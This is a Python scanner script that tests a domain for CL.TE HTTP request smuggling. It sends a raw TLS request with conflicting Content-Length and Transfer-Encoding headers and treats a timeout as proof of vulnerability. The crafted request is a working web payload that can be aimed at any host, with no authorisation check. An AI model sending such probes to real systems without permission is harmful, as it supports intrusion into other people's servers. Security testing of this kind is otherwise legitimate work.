import socket
import ssl
import sys
import time

def scan_smuggling(host):
    print(f"\n[*] Bhai, starting HTTP Request Smuggling (CL.TE) Scan on: {host}")
    print("[*] Bypassing normal libraries. Using Raw Sockets for Protocol Hacking...\n")
    print("--------------------------------------------------")

    port = 443

    # THE MALFORMED PAYLOAD (CL.TE Attack)
    # Frontend will read Content-Length: 4 (The whole body: 1\r\nZ\r\n)
    # Backend will read Transfer-Encoding. It reads '1', then 'Z', then waits for '0' (End of chunk).
    # Since we don't send '0', the backend hangs and times out! This timing proves the vulnerability.
    
    payload = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: keep-alive\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "1\r\n"
        "Z\r\n"
    ).encode('utf-8')

    try:
        # Create a raw socket and wrap it in SSL/TLS (HTTPS)
        context = ssl.create_default_context()
        sock = socket.create_connection((host, port), timeout=5)
        ssock = context.wrap_socket(sock, server_hostname=host)

        print("[*] Connected via Raw SSL Socket!")
        print("[*] Injecting Conflicting Headers (CL & TE) into the pipeline...")
        
        # Send the payload
        start_time = time.time()
        ssock.sendall(payload)

        # Wait for response
        try:
            response = ssock.recv(4096)
            end_time = time.time()
            time_taken = end_time - start_time
            
            print(f"[*] Response received in {round(time_taken, 2)} seconds.")
            
            if response:
                print("\n[-] Server responded immediately. It is likely SECURE against basic CL.TE smuggling.")
                print("[-] Both frontend and backend agreed on the request boundary.")
                
        except socket.timeout:
            # THIS IS THE JACKPOT!
            print("\n   [!!!] JACKPOT 🎯 TIMEOUT DETECTED!")
            print("   [!!!] The Backend is waiting for the rest of the chunked data!")
            print("   [!!!] The Frontend sent it based on Content-Length, but Backend is using Transfer-Encoding.")
            print("   [!!!] Result: VULNERABLE TO CL.TE HTTP REQUEST SMUGGLING!")

        ssock.close()

    except Exception as e:
        print(f"\n[-] Arre yaar, socket connection failed: {e}")

    print("--------------------------------------------------")
    print("[+] Smuggling Hunt Complete, Bhai!")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 smuggle_hunter.py <domain_name>")
        print("Example: python3 smuggle_hunter.py target.com")
        sys.exit(1)
        
    target_domain = sys.argv[1]
    # Remove http:// or https:// if user accidentally added it
    target_domain = target_domain.replace("https://", "").replace("http://", "").split("/")[0]
    scan_smuggling(target_domain)
